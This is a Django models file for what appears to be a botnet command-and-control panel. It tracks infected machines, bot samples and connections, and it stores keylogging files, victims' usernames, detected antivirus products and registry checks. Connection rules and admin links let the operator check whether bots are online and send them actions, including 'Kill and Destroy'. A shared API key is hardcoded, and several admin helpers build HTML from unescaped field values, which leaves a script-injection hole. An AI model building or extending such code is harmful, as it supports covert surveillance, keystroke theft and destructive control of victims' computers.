from django.db import models

# Create your models here.
class System_Information(models.Model):
	mac_address = models.CharField(max_length=20, unique=True, primary_key=True, verbose_name="Mac Address")
	op_system = models.CharField(max_length=30, default='None', verbose_name="Operating System")
	cpu = models.CharField(max_length=20, default='None', verbose_name="CPU")
	created = models.DateTimeField(auto_now_add=True, null=True, verbose_name="Date Added")
	connection_allowed = models.BooleanField(default=True, verbose_name="Is connection allowed?")
	class Meta:
		verbose_name = 'System Information'
		verbose_name_plural = ' Information    - System Information'

	def system_report(self):
		return ('<a href="" onclick="window.open(\'/database/api/get_system_report?key=H4G9A79B&mac_address='+self.mac_address+'\');">Get Report</a>')

	system_report.allow_tags = True

	def __str__(self):
		return self.mac_address

################################## START BOT STUFF #############
class Bot_Sample(models.Model):
	bot_id = models.CharField(max_length=40, verbose_name="Bot ID")
	created = models.DateTimeField(auto_now_add=True, verbose_name="Date Created")
	connection_count = models.IntegerField(default=0, verbose_name="Connection Count")
	connection_allowed = models.BooleanField(default=True, verbose_name="Is connection allowed?")

	class Meta:
		verbose_name = 'Bot Sample'
		verbose_name_plural = '  Botmaster - Bot Samples'


	def bot_report(self):
		return ('<a href="" onclick="window.open(\'/database/api/get_bot_report?key=H4G9A79B&bot_id='+self.bot_id+'\');">Get Report</a>')

	bot_report.allow_tags = True

	def __str__(self):
		return self.bot_id

class Action(models.Model):
	action = models.CharField(max_length=40, verbose_name="Action Name")
	enabled = models.BooleanField(default=True, verbose_name="Is action active?")
	frequency = models.CharField(max_length=40, choices=[('Once','Once'),('Anytime','Anytime'),('Hourly','Hourly'),('Daily','Daily'),('Weekly','Weekly'),('Biweekly','Biweekly'),('Monthly','Monthly'),('Quarterly','Quarterly'),('Bianually','Bianually'),('Yearly','Yearly')], default='Anytime', verbose_name="Frequency")

	class Meta:
		verbose_name = 'Action'
		verbose_name_plural = '  Botmaster - Actions'

	def __str__(self):
		return str(self.action) + str("  (")  +str(self.frequency) + str(")")

class Bot_Action(models.Model):
	bot_id = models.ForeignKey(Bot_Sample)
	action = models.ForeignKey(Action)
	enabled = models.BooleanField(default=True, verbose_name="Is action available to bot?")
	action_count = models.IntegerField(default=0, verbose_name="Action Count")
	last_performed = models.DateTimeField(auto_now=True, verbose_name="Last performed")

	class Meta:
		verbose_name = 'Bot Action'
		verbose_name_plural = ' Botmaster - Bot Actions'
##################################  END BOT STUFF  ##############

class Connection(models.Model):
	bot_id = models.ForeignKey(Bot_Sample)
	mac_address = models.ForeignKey(System_Information)
	ip_address = models.CharField(max_length=20, verbose_name="IP Address")
	connection_type = models.CharField(max_length=60, default='NA', verbose_name="Connection Type")
	timestamp = models.DateTimeField(auto_now_add=True, verbose_name="Date Connected")

	def connection_report(self):
		return ('<a href="" onclick="window.open(\'/database/api/get_connection_report?connection_id='+str(self.id)+'&key=H4G9A79B\');">Get Report</a>')

	connection_report.allow_tags = True

	class Meta:
		verbose_name = 'Connection'
		verbose_name_plural = ' Information - Connections'

	def __str__(self):
		return str(self.id)

class Location(models.Model):
	ip_address = models.CharField(max_length = 20, unique=True)
	country = models.CharField(max_length=50, verbose_name="County")

	class Meta:
		verbose_name = 'Location'
		verbose_name_plural = ' Information - Locations'

	def __str__(self):
		return self.country

	def location_report(self):
		return ('<a href="" onclick="window.open(\'/database/api/get_ip_report?key=H4G9A79B&ip_address='+self.ip_address+'\');">Get Report</a>')

	location_report.allow_tags = True

class Antivirus(models.Model):
	connection = models.ForeignKey(Connection, verbose_name='Connection ID')
	#mac_address = models.ForeignKey(System_Information)
	antivirus_detected = models.CharField(max_length=40, verbose_name="Detected Antivirus")
	class Meta:
		verbose_name = 'Antivirus'
		verbose_name_plural = ' Information   - Antiviruses'

	def mac_address(self):
		return self.connection.mac_address.mac_address
	def timestamp(self):
		return self.connection.timestamp

	def __str__(self):
		return self.antivirus_detected

class User(models.Model):
	connection = models.ForeignKey(Connection, verbose_name='Connection ID')
	#mac_address = models.ForeignKey(System_Information)
	username = models.CharField(max_length=40, verbose_name="Username")
	class Meta:
		verbose_name = 'Username'
		verbose_name_plural = ' Information    - Usernames'

	def mac_address(self):
		return self.connection.mac_address.mac_address
	def timestamp(self):
		return self.connection.timestamp

	def __str__(self):
		return self.username

class Keylogging(models.Model):
	connection = models.ForeignKey(Connection, verbose_name='Connection ID')
	#mac_address = models.ForeignKey(System_Information)
	filename = models.CharField(max_length=20, verbose_name="Filename")
	#timestamp = models.DateTimeField(auto_now_add=True, verbose_name="Date Added"))

	class Meta:
		verbose_name = 'Keylogging File'
		verbose_name_plural = ' Information  - Keylogging Files'

	def mac_address(self):
		return self.connection.mac_address.mac_address
	def Date_Added(self):
		return self.connection.timestamp

	def file_link(self):
		return ("<script>function test"+str(self.filename)+"(){var win = window.open('/database/api/get_file?filename="+self.filename+"&mac_address="+str(self.connection.mac_address.mac_address)+"&key=H4G9A79B'); win.focus();}</script><a href='#' id='link' onclick='test"+str(self.filename)+"()'>"+self.filename+".txt</a>")

	file_link.allow_tags = True

	def __str__(self):
		return self.filename


################################## START CONFIGURATION #########
class ConnectionRules(models.Model):
	no_connect_before = models.TimeField(verbose_name='No connections before')
	no_connect_after = models.TimeField(verbose_name='No connections after')
	max_connections_per_day = models.IntegerField(verbose_name='Max connections per day (-1 = no limit)')
	max_connections = models.IntegerField(verbose_name='Max Connections (-1 = no limit)')
	on_failure = models.CharField(max_length = 60, verbose_name="On failure", default='Allow', choices=[('Allow','Allow'),('Deny','Deny'),('Deny:Respond','Deny:Respond'),('Deny:Action','Deny:Action'),('Deny:Respond/Action','Deny:Respond/Action')])
	response = models.CharField(max_length = 60, verbose_name="Response", default='Nothing', choices=[('Nothing','Nothing'),('Disable:Mac Address','Disable:Mac Address'),('Disable:Bot ID','Disable:Bot ID'),('Disable:Mac/Bot','Disable:Mac/Bot')])
	action = models.CharField(max_length = 60, verbose_name="Action to send", default='Nothing', choices=[('Nothing','Nothing'),('Kill','Action:Kill'),('Kill and Destroy','Action:Kill and Destroy')])
	active = models.BooleanField(default=True, verbose_name='Are rules active?')

	class Meta:
		verbose_name = 'Connection Rules'
		verbose_name_plural = 'Configuration  - Connection Rules'

	def __str___(self):
		return self.id

class Rules(models.Model):
	rule = models.CharField(max_length = 100, verbose_name='Rule')
	rule_type = models.CharField(max_length=60, choices=[('IP','IP'),('Mac Address','Mac Address')], default='IP', verbose_name="Rule Type")
	active = models.BooleanField(default=True,verbose_name='Is rule active?')
	#timestamp = models.DateTimeField(auto_now_add=True, verbose_name="Date Modified")

	class Meta:
		verbose_name = 'Custom Rules'
		verbose_name_plural = 'Configuration  - Custom Rules'

	def __str___(self):
		return self.id

class AvailableRegistry(models.Model):
	registry_key = models.CharField(max_length = 100, verbose_name = 'Registry')
	registry_type = models.CharField(max_length = 30, verbose_name = 'Registry Type')
	timestamp = models.DateTimeField(auto_now_add=True, verbose_name="Date Added")
	active = models.BooleanField(default = True, verbose_name = 'Is registry active for checking?')

	class Meta:
		verbose_name = 'Available Registry'
		verbose_name_plural = 'Configuration  - Available Registry'

	def getID(self):
		return str(self.id)

	def __str__(self):
		return self.registry_key
################################### END CONFIGURATION ##########

class Registry(models.Model):
	connection = models.ForeignKey(Connection, verbose_name='Connection ID')
	#mac_address = models.ForeignKey(System_Information)
	registry = models.ForeignKey(AvailableRegistry, verbose_name='Registry Key')
	detected = models.BooleanField(default = False, verbose_name='Was registry detected?') 
	#registry = models.CharField(max_length=40, verbose_name="Registry Detected")
	class Meta:
		verbose_name = 'Registry'
		verbose_name_plural = ' Information   - Registries'

	def registry_type(self):
		return self.registry.registry_type

	def mac_address(self):
		return self.connection.mac_address.mac_address

	def timestamp(self):
		return self.connection.timestamp

	def __str__(self):
		return self.registry.registry_key

class AvailableConnections(models.Model):
	mac_address = models.ForeignKey(System_Information, verbose_name = 'Mac Address')
	bot_id = models.ForeignKey(Bot_Sample, verbose_name='Bot ID')
	ip_address = models.CharField(max_length=20, verbose_name='IP Address')
	port = models.CharField(max_length=10, verbose_name = 'Port')
	last_online = models.DateTimeField(auto_now=True, verbose_name="Last Online")
	online = models.BooleanField(default=True, verbose_name ='Online?')

	class Meta:
		verbose_name = 'Available Connections'
		verbose_name_plural = 'Configuration  - Available Connections'
		unique_together = ('mac_address', 'bot_id',)

	def check_status(self):
		data = "?mac_address="+str(self.mac_address.mac_address)+"&bot_id="+str(self.bot_id.bot_id)+"&ip_address="+str(self.ip_address)+"&port="+str(self.port)
		return ("<head><script src='http://code.jquery.com/jquery-2.2.1.min.js'></script></head><a href='#' id='link'"+\
			"onclick='"+\
			"var row = document.getElementsByTagName(\"tr\");"+\
			"for(var j = 1; j < row.length; j++){"+\
				"if(row[j].children[1].children[0].text == \""+str(self.mac_address.mac_address)+"\" && row[j].children[2].innerHTML == "+str(self.bot_id.bot_id)+"){"+\
					"row[j].children[7].children[1].text=\"Checking . . .\";"+\
				"}"+\
			"}"+\
			"$.ajax({"+\
			"type:\"GET\","+\
			"url:\"/database/api/server/check_status/"+data+"\","+\
			"success: function(data){"+\
				"var rows = document.getElementsByTagName(\"tr\");"+\
				"for(var i = 1; i < rows.length; i++){"+\
					"if(rows[i].children[1].children[0].text == \""+str(self.mac_address.mac_address)+"\" && rows[i].children[2].innerHTML == "+str(self.bot_id.bot_id)+"){"+\
						"if(data == \"true\"){"+\
							"rows[i].children[6].children[0].src=\"/static/admin/img/icon-yes.gif\";"+\
							"rows[i].children[7].children[1].text=\"Check Status\";"+\
						"}else if(data == \"false\"){"+\
							"rows[i].children[6].children[0].src=\"/static/admin/img/icon-no.gif\";"+\
							"rows[i].children[7].children[1].text=\"Check Status\";"+\
						"}"+\
					"}"+\
				"}"+\
			"}"+\
			"});'>Check Status</a>")

	def action_menu(self):
		avail_actions = Bot_Action.objects.filter(bot_id=self.bot_id)
		if(len(avail_actions)!=0):
			html_insert = "<script>"+\
			"var drop_downs = document.getElementsByTagName('td');"+\
			"for(var i = 0; i < drop_downs.length; i++){"+\
				"if(drop_downs[i].className==\"field-action_menu\"){"+\
					"drop_downs[i].style.padding='2px';"+\
				"}"+\
			"}"+\
			"</script><option value='None'>Actions:</option>"
		else:
			html_insert = "<option value='None'>No Actions:</option>"
		for x in avail_actions:
			html_insert = html_insert + "<option value='"+str(x.action.action)+"'>"+str(x.action.action)+"</option>"
		return ("<select>"+html_insert+"</select>")

	def send_action(self):
		data = "?mac_address="+str(self.mac_address.mac_address)+"&bot_id="+str(self.bot_id.bot_id)+"&ip_address="+str(self.ip_address)+"&port="+str(self.port)
		return ("<head><script src='http://code.jquery.com/jquery-2.2.1.min.js'></script></head><a href='#' id='link'"+\
			"onclick='"+\
			"var row = document.getElementsByTagName(\"tr\");"+\
			"var action = null;"+\
			"var index = 0;"+\
			"for(var j = 1; j < row.length; j++){"+\
				"if(row[j].children[1].children[0].text == \""+str(self.mac_address.mac_address)+"\" && row[j].children[2].innerHTML == "+str(self.bot_id.bot_id)+"){"+\
					"action = row[j].children[8].children[0].value;"+\
					"if(action!=\"None\"){"+\
						"row[j].children[9].children[1].innerHTML=\"Sending . . .\";"+\
						"index = j;"+\
					"}"+\
				"}"+\
			"}"+\
			"if(action!=\"None\"){"+\
				"$.ajax({"+\
				"type:\"GET\","+\
				"url:\"/database/api/server/send_action/"+data+"&action=\"+row[index].children[8].children[0].value,"+\
				"success: function(data){"+\
					"var rows = document.getElementsByTagName(\"tr\");"+\
					"for(var i = 1; i < rows.length; i++){"+\
						"if(rows[i].children[1].children[0].text == \""+str(self.mac_address.mac_address)+"\" && rows[i].children[2].innerHTML == \""+str(self.bot_id.bot_id)+"\"){"+\
							"rows[i].children[9].children[1].innerHTML=\"Send Action\";"+\
						"}"+\
					"}"+\
				"}"+\
			"});"+\
			"}'>Send Action</a>")

	check_status.allow_tags = True
	action_menu.allow_tags = True
	send_action.allow_tags = True

	def __str__(self):
		return str(self.online)